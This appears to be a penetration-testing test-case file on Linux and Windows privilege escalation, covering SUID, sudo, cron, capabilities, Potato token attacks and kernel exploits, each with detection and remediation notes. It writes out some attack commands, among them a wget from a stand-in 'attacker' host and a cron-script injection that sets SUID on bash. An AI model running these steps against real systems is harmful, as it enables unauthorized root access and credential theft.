# Privilege Escalation Test Cases

> This file is a companion to `SKILL.md`, providing structured test cases for privilege escalation scenarios. All tests are performed only within authorized scope.

---

## Test Case Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. Automated Enumeration | 1 | MEDIUM |
| B. SUID Binary Exploitation | 1 | HIGH - CRITICAL |
| C. sudo Misconfiguration | 1 | HIGH - CRITICAL |
| D. GTFOBins Shell Escape | 1 | HIGH |
| E. Windows Token Impersonation | 1 | CRITICAL |
| F. Kernel Exploit Identification | 1 | HIGH - CRITICAL |
| G. Cron Job Abuse | 1 | HIGH |
| H. Capabilities Exploitation | 1 | HIGH - CRITICAL |
| **Total** | **8** | **MEDIUM - CRITICAL** |

---

## A. Automated Enumeration

### TC-PE-001: linpeas Automated Enumeration and Output Analysis

| Field | Content |
|------|------|
| **ID** | TC-PE-001 |
| **Name** | linpeas Automated Enumeration and Output Analysis |
| **Severity** | MEDIUM |
| **Objective** | Verify the ability to execute linpeas for comprehensive automated privilege escalation enumeration, identify all viable escalation vectors, and prioritize findings for manual exploitation |
| **Prerequisites** | Low-privilege shell on Linux target; ability to transfer and execute linpeas.sh; target has bash available |
| **Test Steps** | 1. Transfer linpeas.sh to target: `wget http://attacker:8000/linpeas.sh -O /tmp/linpeas.sh`<br>2. Set executable permission: `chmod +x /tmp/linpeas.sh`<br>3. Run with full checks: `/tmp/linpeas.sh -a 2>/dev/null \| tee /tmp/linpeas.out`<br>4. Analyze color-coded output: RED/YELLOW entries indicate high-probability vectors<br>5. Cross-reference linpeas findings with manual verification commands<br>6. Prioritize findings: SUID misconfigurations, sudo rules, writable cron scripts, kernel version matches |
| **Expected Results** | linpeas completes full enumeration; all potential escalation vectors are identified and categorized; high-priority findings are manually verified before exploitation attempts |
| **Defense Detection** | File integrity monitoring detects linpeas upload; process auditing logs bash execution of unknown script; EDR flags suspicious enumeration behavior patterns |
| **Remediation** | Implement file integrity monitoring on critical system directories; configure auditd to log privilege-related events; restrict bash execution for service accounts; deploy EDR with behavioral analysis for enumeration patterns |
| **Pass Criteria** | linpeas completes full enumeration without errors; all RED/YELLOW findings are documented; at least one viable escalation vector is identified and manually verified |
| **Reference** | `payloads.md` Section 1.1, `guides/linux-privilege-escalation-enumeration-guide.md` |

---

## B. SUID Binary Exploitation

### TC-PE-002: SUID Binary Discovery and GTFOBins Exploitation

| Field | Content |
|------|------|
| **ID** | TC-PE-002 |
| **Name** | SUID Binary Discovery and GTFOBins Exploitation |
| **Severity** | CRITICAL |
| **Objective** | Verify the ability to discover non-standard SUID binaries and exploit them via GTFOBins techniques to achieve root-level access
| **Prerequisites** | Low-privilege shell on Linux target; at least one non-standard SUID binary present that maps to a GTFOBins entry |
| **Test Steps** | 1. Enumerate all SUID binaries: `find / -perm -4000 -type f 2>/dev/null`<br>2. Compare results against standard system SUID list to identify non-standard entries<br>3. Cross-reference each non-standard SUID binary against GTFOBins (https://gtfobins.github.io)<br>4. Identify exploitation method: shell escape, file read, file write, or command execution<br>5. Execute GTFOBins exploitation command for the identified binary<br>6. Verify escalation: `id` should show uid=0(root) |
| **Expected Results** | Non-standard SUID binary is identified and exploited via GTFOBins technique; root shell or root-level file access is achieved |
| **Defense Detection** | File integrity monitoring detects SUID bit changes; process auditing logs execution of non-standard SUID binaries; auditd records privilege escalation events |
| **Remediation** | Audit all SUID binaries and remove unnecessary SUID bits; implement application whitelisting; deploy file integrity monitoring on /usr/bin and /usr/sbin; regularly scan for unauthorized SUID changes |
| **Pass Criteria** | Non-standard SUID binary is identified and matched to GTFOBins entry; exploitation achieves uid=0(root) shell; complete attack path is documented |
| **Reference** | `payloads.md` Section 2.1, 2.2, `guides/linux-privilege-escalation-enumeration-guide.md` |

---

## C. sudo Misconfiguration

### TC-PE-003: sudo Rule Misconfiguration Abuse

| Field | Content |
|------|------|
| **ID** | TC-PE-003 |
| **Name** | sudo Rule Misconfiguration Abuse |
| **Severity** | HIGH |
| **Objective** | Verify the ability to identify and exploit sudo rule misconfigurations including NOPASSWD entries, wildcard injection, LD_PRELOAD abuse, and user ID negation bypasses
| **Prerequisites** | Low-privilege shell on Linux target; current user has sudo permissions for at least one binary; sudo rules contain exploitable misconfigurations |
| **Test Steps** | 1. Enumerate sudo permissions: `sudo -l`<br>2. Analyze each sudo rule for exploitable patterns:<br>&nbsp;&nbsp;- NOPASSWD entries for shell-capable binaries (vim, find, python, less, etc.)<br>&nbsp;&nbsp;- Wildcard rules allowing file manipulation (tar, cp, mv with glob patterns)<br>&nbsp;&nbsp;- env_keep+=LD_PRELOAD enabling shared library injection<br>&nbsp;&nbsp;- User ID negation rules (ALL, !root)<br>3. Select the highest-reliability exploitation vector<br>4. Execute exploitation command from GTFOBins or manual technique<br>5. Verify escalation: `id` confirms root privileges |
| **Expected Results** | sudo misconfiguration is exploited to spawn a root shell or execute commands as root without the root password |
| **Defense Detection** | sudo log entries (auth.log / secure.log) record privilege escalation attempts; SIEM alerts on unexpected sudo usage patterns; auditd captures sudo execution details |
| **Remediation** | Audit all sudo rules and remove unnecessary NOPASSWD entries; disable env_keep for LD_PRELOAD; use explicit command paths instead of wildcards; implement sudo logging with sudoreplay |
| **Pass Criteria** | sudo misconfiguration is identified via sudo -l; exploitation spawns a root shell or executes commands as root; escalation is verified with id command showing uid=0 |
| **Reference** | `payloads.md` Section 3.1 through 3.5 |

---

## D. GTFOBins Shell Escape

### TC-PE-004: GTFOBins Shell Escape via Binary Functionality

| Field | Content |
|------|------|
| **ID** | TC-PE-004 |
| **Name** | GTFOBins Shell Escape via Binary Functionality |
| **Severity** | HIGH |
| **Objective** | Verify the ability to escape restricted shells and escalate privileges using documented GTFOBins techniques for binaries with SUID, sudo, or capability-based privilege contexts
| **Prerequisites** | Low-privilege shell on Linux target; access to a binary listed in GTFOBins with SUID, sudo, or capabilities that enable shell escape; GTFOBins reference available |
| **Test Steps** | 1. Identify exploitable binaries through enumeration (SUID, sudo -l, getcap)<br>2. Look up each binary in GTFOBins and identify applicable functions: shell, file read, file write, sudo, suid, capabilities<br>3. For shell escape: identify the exact command syntax from GTFOBins for the binary and privilege context<br>4. Execute the shell escape command, ensuring the correct flags (-p for preserved privilege)<br>5. Confirm the new shell retains elevated privileges: `id` shows euid=0<br>6. If direct shell escape fails, try file-write vectors to modify /etc/passwd or add SSH keys to /root/.ssh/authorized_keys |
| **Expected Results** | A root-privileged shell is obtained through the GTFOBins-documented technique for the specific binary |
| **Defense Detection** | Process execution auditing; parent-child process relationship monitoring (shell spawned from unusual binary); file integrity monitoring for /etc/passwd and authorized_keys changes |
| **Remediation** | Restrict binary execution with application whitelisting; monitor parent-child process relationships for anomalies; implement file integrity monitoring on /etc/passwd and SSH authorized_keys |
| **Pass Criteria** | Shell escape retains elevated privileges (euid=0); or file write vector successfully modifies /etc/passwd or authorized_keys; root access is verified with id command |
| **Reference** | `payloads.md` Section 2.2, `guides/linux-privilege-escalation-enumeration-guide.md` |

---

## E. Windows Token Impersonation

### TC-PE-005: SeImpersonatePrivilege Token Exploitation (Potato Attack)

| Field | Content |
|------|------|
| **ID** | TC-PE-005 |
| **Name** | SeImpersonatePrivilege Token Exploitation via Potato Attack |
| **Severity** | CRITICAL |
| **Objective** | Verify the ability to exploit SeImpersonatePrivilege through Potato attack variants to impersonate SYSTEM token and achieve SYSTEM-level command execution
| **Prerequisites** | Low-privilege shell on Windows target; current user holds SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common for service accounts including IIS, SQL, and MSSQL); Potato attack tool (JuicyPotato, PrintSpoofer, or GodPotato) available or transferable |
| **Test Steps** | 1. Verify token privileges: `whoami /priv` — confirm SeImpersonatePrivilege is present<br>2. Identify Windows version and build: `systeminfo \| findstr /B /C:"OS Name" /C:"OS Version"`<br>3. Select appropriate Potato tool based on OS version:<br>&nbsp;&nbsp;- Windows 7/8/Server 2008/2012: JuicyPotato with valid CLSID<br>&nbsp;&nbsp;- Windows 10/Server 2016/2019: PrintSpoofer or GodPotato<br>&nbsp;&nbsp;- Windows 11/Server 2022: GodPotato<br>4. Transfer and execute the selected tool to spawn a SYSTEM shell<br>5. Verify escalation: `whoami` returns `nt authority\system` |
| **Expected Results** | SeImpersonatePrivilege is exploited to impersonate SYSTEM token; SYSTEM-level command execution is achieved |
| **Defense Detection** | Token manipulation detected by advanced EDR; process token audit events in Windows Security log; behavioral analysis flags service account spawning unexpected processes |
| **Remediation** | Remove SeImpersonatePrivilege from service accounts where not required; deploy Credential Guard on Windows 10+; monitor for Potato-style attack tools; implement EDR with token manipulation detection |
| **Pass Criteria** | SeImpersonatePrivilege is confirmed via whoami /priv; Potato attack successfully spawns SYSTEM shell; whoami returns nt authority\system |
| **Reference** | `payloads.md` Section 8.1, 8.2, `guides/windows-privilege-escalation-attack-guide.md` |

---

## F. Kernel Exploit Identification

### TC-PE-006: Kernel Exploit Identification and Safe Execution

| Field | Content |
|------|------|
| **ID** | TC-PE-006 |
| **Name** | Kernel Exploit Identification and Safe Execution |
| **Severity** | HIGH |
| **Objective** | Verify the ability to identify applicable kernel exploits using linux-exploit-suggester and safely execute a selected exploit to achieve root access without destabilizing the target system
| **Prerequisites** | Low-privilege shell on Linux target; kernel version is outdated and vulnerable to known CVEs; linux-exploit-suggester tool available or transferable; no viable misconfiguration-based escalation vectors remain |
| **Test Steps** | 1. Identify precise kernel version: `uname -r` and `cat /etc/os-release`<br>2. Run linux-exploit-suggester: `./linux-exploit-suggester.sh`<br>3. Review suggested exploits ranked by reliability (highest first)<br>4. Evaluate each candidate: check compilation requirements, architecture compatibility, and known reliability ratings<br>5. If compilation on target is needed, verify gcc/build tools availability<br>6. Compile and execute the selected exploit<br>7. Verify escalation: `id` shows uid=0(root)<br>8. If exploit fails or crashes the system, document the attempt and move to the next candidate |
| **Expected Results** | A kernel vulnerability is identified and safely exploited to achieve root access without destabilizing the target system |
| **Defense Detection** | Kernel exploit execution triggers syscall anomalies; kernel module loading events logged; EDR behavioral analysis detects privilege manipulation at kernel level; system instability or crash logs |
| **Remediation** | Maintain current kernel versions with security patches; enable kernel hardening features (KASLR, SMEP, SMAP); deploy kernel-level integrity monitoring; restrict unprivileged user access to kernel information |
| **Pass Criteria** | Kernel vulnerability is identified with linux-exploit-suggester; selected exploit compiles and executes without system crash; root shell is obtained and verified with id showing uid=0 |
| **Reference** | `payloads.md` Section 7.1, 7.2, `guides/kernel-exploit-safety-guide.md` |

---

## G. Cron Job Abuse

### TC-PE-007: Cron Job Script Hijacking for Privilege Escalation

| Field | Content |
|------|------|
| **ID** | TC-PE-007 |
| **Name** | Cron Job Script Hijacking for Privilege Escalation |
| **Severity** | HIGH |
| **Objective** | Verify the ability to identify and exploit writable cron scripts, PATH hijacking, and wildcard abuse in scheduled tasks to achieve root-level code execution
| **Prerequisites** | Low-privilege shell on Linux target; at least one cron job runs as root with a writable script or a writable directory in the cron PATH; or pspy reveals a hidden cron execution |
| **Test Steps** | 1. Enumerate cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.d/`, `crontab -l`<br>2. Find writable cron scripts: `find /etc/cron* -writable 2>/dev/null`<br>3. If no obvious writable scripts, use pspy to discover hidden cron executions: `./pspy64 -pf -i 1000`<br>4. Identify the script path and its cron schedule (frequency)<br>5. Append escalation payload to the writable script: `echo 'chmod u+s /bin/bash' >> /path/to/cron_script.sh`<br>6. Wait for the next cron execution cycle<br>7. Execute the SUID bash: `/bin/bash -p`<br>8. Verify escalation: `id` shows uid=0(root) |
| **Expected Results** | Root-owned cron job executes injected payload; root shell is obtained on the next cron cycle |
| **Defense Detection** | File integrity monitoring on cron directories; cron job execution logging (syslog); auditd file write events on cron scripts |
| **Remediation** | Set correct permissions on cron scripts (owned by root, not writable by others); use absolute paths in cron jobs; monitor cron directories with file integrity tools; avoid using shell scripts for root cron tasks |
| **Pass Criteria** | Writable cron script is identified via enumeration; payload is injected and executed on next cron cycle; root shell is obtained via SUID bash or equivalent |
| **Reference** | `payloads.md` Section 5.1 through 5.4, `guides/linux-privilege-escalation-enumeration-guide.md` |

---

## H. Capabilities Exploitation

### TC-PE-008: Linux Capabilities Exploitation for Privilege Escalation

| Field | Content |
|------|------|
| **ID** | TC-PE-008 |
| **Name** | Linux Capabilities Exploitation for Privilege Escalation |
| **Severity** | HIGH |
| **Objective** | Verify the ability to enumerate Linux capabilities on system binaries and exploit dangerous capability assignments (cap_setuid, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace) to achieve privilege escalation
| **Prerequisites** | Low-privilege shell on Linux target; at least one binary has capabilities assigned that enable privilege escalation (cap_setuid, cap_dac_read_search, cap_net_raw, cap_sys_admin, cap_sys_ptrace); getcap and capsh available |
| **Test Steps** | 1. Enumerate all capabilities: `getcap -r / 2>/dev/null`<br>2. Display current capability context: `capsh --print`<br>3. Analyze each capability assignment for exploitability:<br>&nbsp;&nbsp;- cap_setuid on python/perl/ruby: spawn root shell<br>&nbsp;&nbsp;- cap_dac_read_search on tar/cat: read /etc/shadow<br>&nbsp;&nbsp;- cap_net_raw on tcpdump: capture credentials from network traffic<br>&nbsp;&nbsp;- cap_sys_admin on mount: mount host filesystem<br>&nbsp;&nbsp;- cap_sys_ptrace on gdb/strace: inject into root process<br>4. Execute the exploitation command for the identified capability<br>5. Verify escalation: `id` or file access confirms elevated privileges |
| **Expected Results** | Assigned Linux capabilities on a binary are exploited to gain root access or read/write protected files |
| **Defense Detection** | Capability assignment audit (file extended attributes); SELinux/AppArmor capability restrictions; process capability monitoring via auditd |
| **Remediation** | Audit all capability assignments with getcap; remove unnecessary capabilities from binaries; use SELinux or AppArmor to restrict capability usage; monitor capability changes with auditd rules |
| **Pass Criteria** | Dangerous capability is identified on a binary; exploitation achieves root shell or protected file access; escalation is verified with id or file read confirmation |
| **Reference** | `payloads.md` Section 4.1, 4.2 |

---

## Test Execution Notes

- All test cases must be executed only within written authorization scope
- Document every command executed, every file modified, and every result observed
- Failed exploitation attempts must be reported alongside successful ones
- Map all techniques to MITRE ATT&CK technique IDs in the final report
- Clean up all uploaded tools, modified files, and temporary artifacts before disconnecting
- Kernel exploit tests (TC-PE-006) require explicit authorization due to crash risk on production systems

---

## MITRE ATT&CK Mapping

| Test Case | MITRE ATT&CK Technique | Technique Name |
|-----------|------------------------|----------------|
| TC-PE-001 | T1087.001 | Account Discovery: Local Account |
| TC-PE-002 | T1548.001 | Abuse Elevation Control: Setuid and Setgid |
| TC-PE-003 | T1548.003 | Abuse Elevation Control: Sudo and Sudo Caching |
| TC-PE-004 | T1548.001 | Abuse Elevation Control: Setuid and Setgid |
| TC-PE-005 | T1134.002 | Access Token Manipulation: Create Process with Token |
| TC-PE-006 | T1068 | Exploitation for Privilege Escalation |
| TC-PE-007 | T1053.003 | Scheduled Task/Job: Cron |
| TC-PE-008 | T1548.001 | Abuse Elevation Control: Setuid and Setgid |

---

_All test cases must be executed only within written authorization scope. Unauthorized use is illegal._

_Last updated: 2026-06-04_
